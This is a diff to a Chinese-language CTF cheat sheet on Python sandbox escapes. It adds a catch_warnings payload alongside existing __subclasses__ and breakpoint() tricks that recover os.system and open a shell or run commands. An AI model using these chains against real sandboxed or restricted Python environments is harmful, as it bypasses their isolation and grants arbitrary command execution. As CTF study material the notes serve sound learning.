@@ -24,4 +24,5 @@ chr 数字转字符，ord 字符转数字。
 ```python
 breakpoint()  # 进入 pdb，然后为所欲为
 ().__class__.__base__.__subclasses__()[-73].__init__.__globals__['system']('sh') # 在 __builtins__ 被橄榄之后，通过用 -1 ~ -150 替换“-73”来拿到 shell
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']("os").system("ls")
 ```
